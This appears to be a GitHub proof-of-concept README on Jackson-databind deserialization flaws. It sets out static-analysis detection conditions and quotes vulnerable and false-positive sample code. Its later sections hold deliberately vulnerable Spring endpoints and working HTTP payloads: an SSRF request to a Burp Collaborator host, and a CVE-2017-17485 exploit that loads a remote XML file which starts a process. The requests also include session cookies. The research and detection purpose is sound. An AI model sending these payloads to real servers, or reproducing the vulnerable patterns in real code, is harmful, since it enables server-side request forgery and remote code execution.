# jackson-databind-POC

### Vulnerability example/false positive example

Let's look at a few examples of white box detection vulnerabilities:
Source: https://github.com/find-sec-bugs/find-sec-bugs/blob/master/findsecbugs-samples-java/src/test/java/testcode/serial/UnsafeJacksonObjectDeserialization.java

```java
public class UnsafeJacksonObjectDeserialization {

    static class ABean {
        public int id;
        public Object obj;
    }

    static class AnotherBean {
        @JsonTypeInfo (use = JsonTypeInfo. Id. CLASS)
        public Object obj;
    }

    static class YetAnotherBean {
        @JsonTypeInfo (use = JsonTypeInfo. Id. MINIMAL_CLASS)
        public Object obj;
    }

    public void exampleOne(String JSON) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object obj = mapper. readValue(JSON, ABean. class);
    }

    public void exampleTwo(String JSON) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
        Object obj = mapper. readValue(JSON, ABean. class);
    }

    public void exampleThree(String JSON) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        Object obj = mapper. readValue(JSON, AnotherBean. class);
    }

    public void exampleFour(String JSON) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        Object obj = mapper. readValue(JSON, YetAnotherBean. class);
    }

}
```

From the above four examples, it can be concluded that there are several cases of vulnerable Jackson code:
1. exampleOne enables DefaultTyping, and there is an Object type in the serialized class. The default empty constructor is equivalent to `OBJECT_AND_NON_CONCRETE`, which is the second level and can perform object injection;
2. exampleTwo has enabled DefaultTyping, and there is an Object type in the serialized class, and both the interface class and the abstract class can be deserialized, which is the third level, and object injection can be performed;
3. Although DefaultTyping is not enabled for exampleThree, its serialized class is modified by `JsonTypeInfo.Id.CLASS`, and object injection can be performed through `@class`;
4. Although DefaultTyping is not enabled in exampleThree, its serialized class is modified by `JsonTypeInfo.Id.MINIMAL_CLASS`, and object injection can be performed through `@c`;


Let's look at another false positive example of jackson deserialization white box detection:
Source: https://github.com/find-sec-bugs/find-sec-bugs/blob/master/findsecbugs-samples-java/src/test/java/testcode/serial/JacksonSerialisationFalsePositive.java


```java
public class JacksonSerialisationFalsePositive implements Serializable {

    static class Bean {
        @JsonTypeInfo (use = JsonTypeInfo.Id.NAME)
        public Object obj;
    }

    public void exampleOne(String JSON) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        Object obj = mapper. readValue(JSON, JacksonSerialisationFalsePositive. class);
    }

    public void exampleTwo(String JSON) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        Object obj = mapper. readValue(JSON, Bean. class);
    }
}
```

illustrate:
1. DefaultTyping is not enabled in exampleOne, and the class to be deserialized is not modified with `JsonTypeInfo.Id.CLASS/MININAL_CLASS`, so object injection cannot be performed;
2. DefaultTyping is not enabled in exampleTwo, and the class to be deserialized is not decorated with `JsonTypeInfo.Id.CLASS/MININAL_CLASS`, so object injection cannot be performed;


### jackson deserialization white box detection
#### The first feature is about EnableDefaultTyping, pay attention to his multiple overloaded methods, there are 4 in total:
```java
ObjectMapper enableDefaultTyping()
ObjectMapper enableDefaultTyping(DefaultTyping dti)
ObjectMapper enableDefaultTyping(DefaultTyping applicability, JsonTypeInfo.As includeAs)
ObjectMapper enableDefaultTypingAsProperty(DefaultTyping applicability, String propertyName)
```
As long as it is matched, condition A is hit.

#### The second feature is that when readingValue, the specified class itself is Object or it must contain Object type fields or Object type setters.
```java
public <T> T readValue(String content, JavaType valueType)
public <T> T readValue(Reader src, Class<T> valueType)
public <T> T readValue(Reader src, TypeReference valueTypeRef)
public <T> T readValue(Reader src, JavaType valueType)
```
So as long as this is matched, the second parameter needs to be parsed to confirm whether this Model is a Model that can be attacked. If it contains Object or is an Object itself, it is considered that condition B is hit.


#### The third feature is that in the deserialized class, there is a class annotated by JsonTypeInfo, and the content inside is `JsonTypeInfo.Id.CLASS` or `JsonTypeInfo.Id.MINIMAL_CLASS`. Note it as condition C.

The final condition is (A&&B) || C.


An example of C is given below:

```java
public class Jackson {

    static class AnotherBean {
        @JsonTypeInfo (use = JsonTypeInfo. Id. CLASS)
        public Object obj;
    }

    @RequestMapping(value = "/deserialize3", method = {RequestMethod. POST})
    @ResponseBody
    public static String deserialize3(@RequestBody String params) throws IOException {
        System.out.println(params);
        try {
            ObjectMapper objectMapper = new ObjectMapper();
            Object obj = objectMapper. readValue(params, AnotherBean. class);
            return obj.toString();
        } catch (Exception e){
            e.printStackTrace();
            return e.toString();
        }
    }

```
The corresponding payload is:
```http
POST /jackson/deserialize3 HTTP/1.1
Host: cqq.com:8080
Connection: close
Cookie: JSESSIONID=C48313A5CE14AE7A1C15696C03AE0893
Content-Type: application/json
Content-Length: 127

{"obj":{"@class":"javax.swing.JEditorPane","page":"http://ivh6gf9nkrbys3l03uppuzvv9mfg35.burpcollaborator.net:80/?a=1&b=2222"}}
```


### Demo
The following demonstrates the method from HTTP request to Spring, then readValue, and finally triggers the gadget method. Here is an SSRF example.
![](jackson-JsonTypeInfo_id_class-poc.gif)

### Reproduce CVE-2017-17485

#### Sphere of influence
- Jackson-databind version <= 2.9.3

- Jackson-databind version <= 2.7.9.1

- Jackson-databind version <= 2.8.10
Reference: https://github.com/RealBearcat/Jackson-CVE-2017-17485

#### Vulnerability environment
Modify pom.xml and set the version of jackson-databind to 2.9.3:
```xml
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.9.3</version>
    	</dependency>
```

Using existing vulnerable code:
```java
    static class ABean {
        public int id;
        public Object obj;
    }

    @RequestMapping(value = "/deserialize2", method = {RequestMethod. POST})
    @ResponseBody
    public static String deserialize2(@RequestBody String params) throws IOException {
        // If the Content-Type does not set the application/json format, the post data will be url-encoded
        System.out.println(params);
        try {
            ObjectMapper objectMapper = new ObjectMapper();
            objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
            objectMapper.readValue(params, ABean.class);
            return "deserialize2";
        } catch (Exception e){
            e.printStackTrace();
            return e.toString();
        }
    }
```

#### PoC
Since the class to be deserialized is an ABean, write the following PoC according to the format of the ABean (although the id attribute can also trigger the vulnerability):
```http
POST /jackson/deserialize2 HTTP/1.1
Host: cqq.com:8080
Connection: close
Cookie: confluence-sidebar.width=285; confluence.browse.space.cookie=space-blogposts; JSESSIONID=55F192C960EC2BBE19F71FB85C34D41C; XSRF-TOKEN=867c4ff2-4228-4e97-b9fa-81319af3502 b; remember-me=YWRtaW46MTU4NjQ4OTM3NjIwMzo0ODFhYmVjZjBhODYxMmVlOTE0NmJhZTU5OGYwN2EwMQ
Content-Type: application/json
Content-Length: 171

{"id":1, "obj":["org.springframework.context.support.ClassPathXmlApplicationContext", "https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/spel.xml "]}
```
The content of xml is:
```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java. lang. ProcessBuilder">
        <constructor-arg value="calc.exe" />
        <property name="whatever" value="#{ pb. start() }"/>
    </bean>
</beans>
```

#### Demo
![](jackson-CVE-2017-17485-poc.gif)

### refer to
- https://github.com/JoyChou93/java-sec-code
- https://www.leadroyal.cn/?p=594
- https://www.leadroyal.cn/?p=630
- [Introduction to Jackson Deserialization Vulnerability (4): Defense and Detection Methods [End of the series]](https://www.leadroyal.cn/?p=633)
